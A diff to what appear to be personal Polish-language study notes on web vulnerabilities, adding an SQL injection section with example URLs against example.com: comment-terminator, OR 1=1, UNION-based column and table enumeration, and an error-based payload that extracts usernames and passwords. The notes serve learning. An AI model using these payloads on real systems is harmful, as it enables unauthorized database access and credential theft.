@@ -163,7 +163,13 @@ Miejsca występowania SSRF:
 - Mechanizm uploadu
 - inne protokoły niż HTTP
 Podatność SQL Injection:
-- 
+- SQL Injection to podatność aplikacji webowych, dzięki której napastnik może wstrzyknąć własny fragment zapytania SQL
+- wstrzyknięcie -- (dwa dywizy): https://example.com/search?query=test'--
+- wstrzyknięcie: https://example.com/search?query=test' OR 1=1--
+- wtrzyknięcie UNION-based: https://example.com/search?query=test' UNION SELECT 1,2,3,4,5-- (dla 5 kolumn)
+- Próba wydobycia nazw wszystkich tabel: https://example.com/search?query=test' UNION SELECT null,null,table_name,null,null FROM information_schema.tables--
+- wstrzyknięcie ERROR-based: https://example.com/search?query=test' AND CAST((SELECT blog_user||'/'||user_password FROM blog_users) AS integer)--
+- wstrzyknięcie BLIND (content based): 
 
 ---TODO:
 - modify requests and responses with C# (how?)?
